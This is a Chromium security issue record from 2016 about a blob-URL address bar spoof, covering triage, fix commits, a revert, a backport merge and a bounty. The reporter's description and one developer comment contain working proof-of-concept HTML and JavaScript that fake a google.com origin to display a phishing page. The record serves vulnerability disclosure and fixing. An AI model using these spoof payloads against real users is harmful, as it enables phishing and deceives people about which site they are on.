# Security:  Address Bar URL Spoofing

| Field | Value |
|-------|-------|
| **Issue ID** | [40085381](https://issues.chromium.org/issues/40085381) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Navigation, UI>Browser>Omnibox |
| **Reporter** | xi...@gmail.com |
| **Assignee** | ni...@chromium.org |
| **Created** | 2016-09-13 |
| **Bounty** | $500.00 |

## Description

**VERSION**  

Chrome Version: 53.0.2785.101 (64-bit)  

Operating System: [MAC OS 10.12, Windows 7&10]

DESCRIPTION:

Chrome Address Bar URL spoofing

POC:

<script>
function pwned() {
var t = window.open('', 'ss');
t.document.write("<h1>phishing page</h1><title>google</title>");
t.stop();
}
</script>

<a href="blob:http://www.google.com%EF%BE%A0…………@xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me1</a><br>  

<br>  

<a href="blob:http://www.google.com …………@xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a><br>

Online demo: <http://xisigr.com/test/spoof/chrome/blob.html>

## Attachments

- [blob.html](attachments/blob.html) (text/plain, 3.1 KB)

## Timeline

### pe...@chromium.org (2016-09-13)

Hello Matt,

Could you please help triage this ticket?  It seems very similar to a few other spoofing tickets currently assigned to you.

Thank you!

[Monorail components: Security>UX UI>Browser>Navigation UI>Browser>Omnibox]

### cr...@chromium.org (2016-09-13)

pennymac@: My team tends to handle most URL spoofs.  I think we'll probably take this one.

This is a combo of invalid blob URL and bypassing the https://crbug.com/chromium/9682 defense.  We may want to raise the severity; most URL spoofs are high, I think.

### ni...@chromium.org (2016-09-13)

This is clever. www.google.com followed by a bunch of spaces is used as a username part of the blob origin.

It sounds like we need better canonicalization of blob URLs inside of GURL.

+mkwst FYI

### ni...@chromium.org (2016-09-13)

Charlie points out that we can also address this partially by handling blob error in a different way; probably putting them in a unique origin.

That's a good idea too, and might be easier to pull off.

### ni...@chromium.org (2016-09-13)

Thinking further about https://crbug.com/chromium/646278#c4, it looks like there's a way to pull off this spoof without requiring a failed blob load at all:

history.replaceState({}, "", "blob:https://www.google.com                                                                                                                                                                       @bugs.chromium.org/2115326q2563q25sgsgsgdasfAgsdgsdg")

So, changing blob 404 behavior alone won't be sufficient to eliminate this spoof.

Severity wise, it is also worth noting is that unicode is allowed (and rendered) from inside the authority portion of the blob URL, so you can potentially spoof paths too by using solidus homographs.

### ni...@chromium.org (2016-09-13)

Assigning to mkwst for further triage --  Do you think it is viable for us to do stricter parsing of blob URLs; in particular, to have gurl canonicalize the |origin| part of blob:origin/path by roundtripping through url::Origin/SchemeHostPort?

Feel free to assign back to me if you can't own this.

### mg...@chromium.org (2016-09-14)

FYI, the combo "%EF%BE%A0" in one of those example URLs represents U+FFA0 HALFWIDTH HANGUL FILLER, which is a narrow space character (and could make the spoof look more believable).

### ni...@chromium.org (2016-09-15)

I forgot to mentioned in #5 that the history.replaceState works when you're already inside a blob URL in the attacker domain. Here's a full snippet that does that too:

window.open(URL.createObjectURL(new Blob(["<scr", "ipt>var scheme = document.origin.split(':')[0] + '://'; history.replaceState({}, '', 'blob:' + scheme + 'google.com' + Array(1024).join(' ') +                                                                                                         '@' + document.origin.substring(scheme.length) + '/foob');</scr", "ipt>" ], {type: 'text/html'})))

### ni...@chromium.org (2016-09-16)

It seems viable to fix this by a check in FilterURL. I've got a prototype implemented.

### ni...@chromium.org (2016-09-16)

Yeah, it looks like this works. Just gonna write some tests, and make sure I haven't regressed behaviors wrt blob:blobinternal, and other weirdly formed blob URLs.

### bu...@chromium.org (2016-09-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697

commit 654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697
Author: nick <nick@chromium.org>
Date: Wed Sep 21 18:08:44 2016

Disallow navigations to blob URLs with non-canonical origins.

BUG=646278
TEST=content_browsertests, included

Review-Url: https://codereview.chromium.org/2347163004
Cr-Commit-Position: refs/heads/master@{#420103}

[add] https://crrev.com/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697/content/browser/blob_storage/blob_url_browsertest.cc
[modify] https://crrev.com/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697/content/browser/child_process_security_policy_impl.cc
[modify] https://crrev.com/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697/content/browser/child_process_security_policy_unittest.cc
[modify] https://crrev.com/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697/content/test/BUILD.gn


### ni...@chromium.org (2016-09-21)

This is fixed; where should we merge it?

### cr...@chromium.org (2016-09-21)

Thanks!  Once it bakes for a day, we should merge to M54 and M53.

### bu...@chromium.org (2016-09-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5a79414a791d28d516e2b5b24b71a25451a8cf75

commit 5a79414a791d28d516e2b5b24b71a25451a8cf75
Author: dewittj <dewittj@chromium.org>
Date: Wed Sep 21 19:19:32 2016

Revert of Disallow navigations to blob URLs with non-canonical origins. (patchset #4 id:60001 of https://codereview.chromium.org/2347163004/ )

Reason for revert:
Likely breaks this layout test:

http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world.html

e.g. https://build.chromium.org/p/chromium.webkit/builders/WebKit%20Linux

--- /mnt/data/b/rr/tmpVD1Qdr/w/layout-test-results/http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world-expected.txt
+++ /mnt/data/b/rr/tmpVD1Qdr/w/layout-test-results/http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world-actual.txt
@@ -1,3 +1,4 @@
 CONSOLE WARNING: line 1: Synchronous XMLHttpRequest on the main thread is deprecated because of its detrimental effects to the end user's experience. For more help, check https://xhr.spec.whatwg.org/.
+CONSOLE ERROR: line 1: Uncaught NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'blob:chrome-extension://123/456789'.
 This tests an isolated script's ability to XHR a blob that is in its security origin, which is not the same as the document's security origin.
 We pass if there are no console errors.

Original issue's description:
> Disallow navigations to blob URLs with non-canonical origins.
>
> BUG=646278
> TEST=content_browsertests, included
>
> Committed: https://crrev.com/654b9b9e4b7bdec1366e1ab378b7a8f5c63fc697
> Cr-Commit-Position: refs/heads/master@{#420103}

TBR=creis@chromium.org,nasko@chromium.org,nick@chromium.org
# Skipping CQ checks because original CL landed less than 1 days ago.
NOPRESUBMIT=true
NOTREECHECKS=true
NOTRY=true
BUG=646278

Review-Url: https://codereview.chromium.org/2358193002
Cr-Commit-Position: refs/heads/master@{#420132}

[delete] https://crrev.com/bec3b350100488afcf90db2df67a5b5995520686/content/browser/blob_storage/blob_url_browsertest.cc
[modify] https://crrev.com/5a79414a791d28d516e2b5b24b71a25451a8cf75/content/browser/child_process_security_policy_impl.cc
[modify] https://crrev.com/5a79414a791d28d516e2b5b24b71a25451a8cf75/content/browser/child_process_security_policy_unittest.cc
[modify] https://crrev.com/5a79414a791d28d516e2b5b24b71a25451a8cf75/content/test/BUILD.gn


### sh...@chromium.org (2016-09-22)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-09-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/a76cc407d8a8530f05b03ece9a831b72f568aef1

commit a76cc407d8a8530f05b03ece9a831b72f568aef1
Author: nick <nick@chromium.org>
Date: Thu Sep 22 20:02:59 2016

(re-land) Disallow navigations to blob URLs with non-canonical origins.

Re-landing this with a fix for xhr-to-blob-in-isolated-world.html

BUG=646278
TEST=content_browsertests, included

Review-Url: https://codereview.chromium.org/2365433002
Cr-Commit-Position: refs/heads/master@{#420436}

[add] https://crrev.com/a76cc407d8a8530f05b03ece9a831b72f568aef1/content/browser/blob_storage/blob_url_browsertest.cc
[modify] https://crrev.com/a76cc407d8a8530f05b03ece9a831b72f568aef1/content/browser/child_process_security_policy_impl.cc
[modify] https://crrev.com/a76cc407d8a8530f05b03ece9a831b72f568aef1/content/browser/child_process_security_policy_unittest.cc
[modify] https://crrev.com/a76cc407d8a8530f05b03ece9a831b72f568aef1/content/test/BUILD.gn
[modify] https://crrev.com/a76cc407d8a8530f05b03ece9a831b72f568aef1/third_party/WebKit/LayoutTests/http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world.html


### xi...@gmail.com (2016-09-23)

Is this bug's SecSeverity-Low?

### cr...@chromium.org (2016-09-23)

Thanks for checking.  I would rate this medium severity (per https://dev.chromium.org/developers/severity-guidelines), since this matches "an address bar spoof where only certain URLs can be displayed."  (The blob prefix must be present, which gives some indication that something unusual is going on.)

### aw...@chromium.org (2016-09-27)

[Empty comment from Monorail migration]

### ni...@chromium.org (2016-10-06)

Let's merge this to M54. The fix for 644966 builds on top of it.

### di...@chromium.org (2016-10-06)

[Automated comment] Less than 2 weeks to go before stable on M54, manual review required.

### bu...@google.com (2016-10-06)

SGTM, approving for merge into M54.

### bu...@chromium.org (2016-10-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2

commit 4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2
Author: creis <creis@chromium.org>
Date: Thu Oct 06 23:33:56 2016

Merges six security fixes to M54, related to blobs.

Merge patch created pair programming style with creis@ and nick@.
Several manual fixups were required to get the tests passing on M54.

BUG=644966,646278,652784
TEST=Manual testing included:
 - Verifying exploit steps w/ chrome w/ --isolate-extensions
 - content_browsertests and content_unittests
 - The following browser_tests subsets, both w/ and w/o --isolate-extensions:
   *ProcessManager*
   *Grants*
   *Exploit*
   *TouchFocuses*
NOPRESUBMIT=true
NOTRY=true
TBR=nick@chromium.org

The following six fixes are included in this diff:

1. https://codereview.chromium.org/2322673005:
  > Fix process transfers for blob urls of sites requiring dedicated processes
  >
  > RenderFrameHostManager::IsRendererTransferNeededForNavigation had a bug
  > where it passed an effective url, instead of an effective SITE url, to
  > a function that was expecting the latter.
  >
  > Add a test that exercises this case. Add a CHECK to content shell browser
  > client to verify that we're actually getting site urls all the time.
  >
  > Committed: https://crrev.com/db193a1b105de523fd0bb089c9769a71ed287d9e
  > Cr-Commit-Position: refs/heads/master@{#417752}

2. https://codereview.chromium.org/2331063002:
  > Fix IsolateIcelandFrameTreeBrowserTest.ProcessSwitchForIsolatedBlob so
  > that it's not flaky under --site-per-process.
  >
  > Committed: https://crrev.com/07fd7e19e0095aeb30bd2c99109d083bb67732cb
  > Cr-Commit-Position: refs/heads/master@{#417987}

3. https://codereview.chromium.org/2365433002:
  > (re-land) Disallow navigations to blob URLs with non-canonical origins.
  >
  > Re-landing this with a fix for xhr-to-blob-in-isolated-world.html
  >
  > Review-Url: https://codereview.chromium.org/2365433002
  > Cr-Commit-Position: refs/heads/master@{#420436}

4. https://codereview.chromium.org/2332263002
   [partial merge, just for the helper function it added, used by later CLs]
  > Updated suborigin serialization to latest spec proposal
  >
  > This modifiest the serialization format of suborigins so they are now
  > represented in the form https-so://suboriginname.host.name (or,
  > alternatively, with the scheme http-so). This change removes collisions
  > with potentially valid URLs that were being deserialized as suborigins.
  >
  > Additionally, this adds suborigins back as an experimental web platform
  > feature rather than a testing feature.
  >
  > Review-Url: https://codereview.chromium.org/2332263002
  > Cr-Commit-Position: refs/heads/master@{#420828}
  > CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation

5. https://codereview.chromium.org/2364633004:
  > Update ChildProcessSecurityPolicy so that the chrome-extension:// scheme
  > is considered "web safe" to be requestable from any process, but only
  > "web safe" to commit in extension processes.
  >
  > In ChildProcessSecurityPolicy::CanRequestURL and CanCommitURL, when
  > seeing blob and filesystem urls, make a security decision based
  > on the inner origin rather than the scheme.
  >
  > When the extensions ProcessManager (via ExtensionWebContentsObserver)
  > notices a RenderFrame being created in an extension SiteInstance,
  > grant that process permission to commit chrome-extension:// URLs.
  >
  > In BlobDispatcherHost, only allow creation of blob URLs from processes
  > that would be able to commit them.
  >
  > Add a security exploit browsertest that verifies the above mechanisms
  > working together.
  >
  > Committed: https://crrev.com/a411fd062bc68fc2b5fc3aca7e4cbb8e4a3e074e
  > Committed: https://crrev.com/2a8ba8c4c186e5ea0a2ed938cc5d41441af64228
  > Cr-Original-Commit-Position: refs/heads/master@{#421964}
  > Cr-Commit-Position: refs/heads/master@{#422474}

6. https://codereview.chromium.org/2396533003:
  > Allow <webview> to access URLs in the origin of the app embedding it.
  >
  > With r422474 creation of blob: URLs with origin of a chrome-extension://
  > was locked down. However, the case of a <webview> loading an
  > accessible_resource from its embedder and creating a blob: is disallowed.
  > This CL adds permission for <webview> to create such URLs in the origin
  > of its embedder.
  >
  > This CL is based on work by nick@chromium.org.
  >
  > Committed: https://crrev.com/5edda59b0b1cb8fff058b47567ac32e58be5168a
  > Cr-Commit-Position: refs/heads/master@{#422976}
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation

Review-Url: https://codereview.chromium.org/2399853003
Cr-Commit-Position: refs/branch-heads/2840@{#672}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/DEPS
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/browser_process_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/chrome_content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/chrome_security_exploit_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/devtools/devtools_sanity_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/extensions/process_manager_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/test/data/extensions/platform_apps/web_view/guest_focus_test/guest.js
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/bad_message.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/blob_storage/blob_dispatcher_host.cc
[add] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/blob_storage/blob_url_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_impl.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_unittest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/frame_host/frame_tree_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/frame_host/render_frame_host_manager.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/loader/resource_dispatcher_host_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/site_instance_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/site_instance_impl.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/content_tests.gypi
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/child_process_security_policy.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/content_browser_client.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/shell/browser/shell_content_browser_client.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/shell/browser/shell_content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/extensions/browser/extension_web_contents_observer.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/extensions/browser/guest_view/web_view/web_view_guest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/third_party/WebKit/LayoutTests/http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world.html


### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-15)

Congratulations - the panel awarded $500 for this bug!

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2

commit 4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2
Author: creis <creis@chromium.org>
Date: Thu Oct 06 23:33:56 2016

Merges six security fixes to M54, related to blobs.

Merge patch created pair programming style with creis@ and nick@.
Several manual fixups were required to get the tests passing on M54.

BUG=644966,646278,652784
TEST=Manual testing included:
 - Verifying exploit steps w/ chrome w/ --isolate-extensions
 - content_browsertests and content_unittests
 - The following browser_tests subsets, both w/ and w/o --isolate-extensions:
   *ProcessManager*
   *Grants*
   *Exploit*
   *TouchFocuses*
NOPRESUBMIT=true
NOTRY=true
TBR=nick@chromium.org

The following six fixes are included in this diff:

1. https://codereview.chromium.org/2322673005:
  > Fix process transfers for blob urls of sites requiring dedicated processes
  >
  > RenderFrameHostManager::IsRendererTransferNeededForNavigation had a bug
  > where it passed an effective url, instead of an effective SITE url, to
  > a function that was expecting the latter.
  >
  > Add a test that exercises this case. Add a CHECK to content shell browser
  > client to verify that we're actually getting site urls all the time.
  >
  > Committed: https://crrev.com/db193a1b105de523fd0bb089c9769a71ed287d9e
  > Cr-Commit-Position: refs/heads/master@{#417752}

2. https://codereview.chromium.org/2331063002:
  > Fix IsolateIcelandFrameTreeBrowserTest.ProcessSwitchForIsolatedBlob so
  > that it's not flaky under --site-per-process.
  >
  > Committed: https://crrev.com/07fd7e19e0095aeb30bd2c99109d083bb67732cb
  > Cr-Commit-Position: refs/heads/master@{#417987}

3. https://codereview.chromium.org/2365433002:
  > (re-land) Disallow navigations to blob URLs with non-canonical origins.
  >
  > Re-landing this with a fix for xhr-to-blob-in-isolated-world.html
  >
  > Review-Url: https://codereview.chromium.org/2365433002
  > Cr-Commit-Position: refs/heads/master@{#420436}

4. https://codereview.chromium.org/2332263002
   [partial merge, just for the helper function it added, used by later CLs]
  > Updated suborigin serialization to latest spec proposal
  >
  > This modifiest the serialization format of suborigins so they are now
  > represented in the form https-so://suboriginname.host.name (or,
  > alternatively, with the scheme http-so). This change removes collisions
  > with potentially valid URLs that were being deserialized as suborigins.
  >
  > Additionally, this adds suborigins back as an experimental web platform
  > feature rather than a testing feature.
  >
  > Review-Url: https://codereview.chromium.org/2332263002
  > Cr-Commit-Position: refs/heads/master@{#420828}
  > CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation

5. https://codereview.chromium.org/2364633004:
  > Update ChildProcessSecurityPolicy so that the chrome-extension:// scheme
  > is considered "web safe" to be requestable from any process, but only
  > "web safe" to commit in extension processes.
  >
  > In ChildProcessSecurityPolicy::CanRequestURL and CanCommitURL, when
  > seeing blob and filesystem urls, make a security decision based
  > on the inner origin rather than the scheme.
  >
  > When the extensions ProcessManager (via ExtensionWebContentsObserver)
  > notices a RenderFrame being created in an extension SiteInstance,
  > grant that process permission to commit chrome-extension:// URLs.
  >
  > In BlobDispatcherHost, only allow creation of blob URLs from processes
  > that would be able to commit them.
  >
  > Add a security exploit browsertest that verifies the above mechanisms
  > working together.
  >
  > Committed: https://crrev.com/a411fd062bc68fc2b5fc3aca7e4cbb8e4a3e074e
  > Committed: https://crrev.com/2a8ba8c4c186e5ea0a2ed938cc5d41441af64228
  > Cr-Original-Commit-Position: refs/heads/master@{#421964}
  > Cr-Commit-Position: refs/heads/master@{#422474}

6. https://codereview.chromium.org/2396533003:
  > Allow <webview> to access URLs in the origin of the app embedding it.
  >
  > With r422474 creation of blob: URLs with origin of a chrome-extension://
  > was locked down. However, the case of a <webview> loading an
  > accessible_resource from its embedder and creating a blob: is disallowed.
  > This CL adds permission for <webview> to create such URLs in the origin
  > of its embedder.
  >
  > This CL is based on work by nick@chromium.org.
  >
  > Committed: https://crrev.com/5edda59b0b1cb8fff058b47567ac32e58be5168a
  > Cr-Commit-Position: refs/heads/master@{#422976}
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation

Review-Url: https://codereview.chromium.org/2399853003
Cr-Commit-Position: refs/branch-heads/2840@{#672}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/DEPS
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/browser_process_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/chrome_content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/chrome_security_exploit_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/devtools/devtools_sanity_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/devtools/devtools_ui_bindings.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/browser/extensions/process_manager_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/chrome/test/data/extensions/platform_apps/web_view/guest_focus_test/guest.js
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/bad_message.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/blob_storage/blob_dispatcher_host.cc
[add] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/blob_storage/blob_url_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_impl.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/child_process_security_policy_unittest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/frame_host/frame_tree_browsertest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/frame_host/render_frame_host_manager.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/loader/resource_dispatcher_host_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/site_instance_impl.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/browser/site_instance_impl.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/content_tests.gypi
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/child_process_security_policy.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/content_browser_client.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/public/browser/content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/shell/browser/shell_content_browser_client.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/content/shell/browser/shell_content_browser_client.h
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/extensions/browser/extension_web_contents_observer.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/extensions/browser/guest_view/web_view/web_view_guest.cc
[modify] https://crrev.com/4cf1e7bf7a79dcd98967ffe8db93490614a8d4b2/third_party/WebKit/LayoutTests/http/tests/xmlhttprequest/xhr-to-blob-in-isolated-world.html


### lg...@chromium.org (2016-11-23)

[Empty comment from Monorail migration]

[Monorail components: -Security>UX UI>Security>UrlFormatting]

### sh...@chromium.org (2016-12-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-28)

This issue was migrated from crbug.com/chromium/646278?no_tracker_redirect=1

[Multiple monorail components: UI>Browser>Navigation, UI>Browser>Omnibox, UI>Security>UrlFormatting]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085381)*
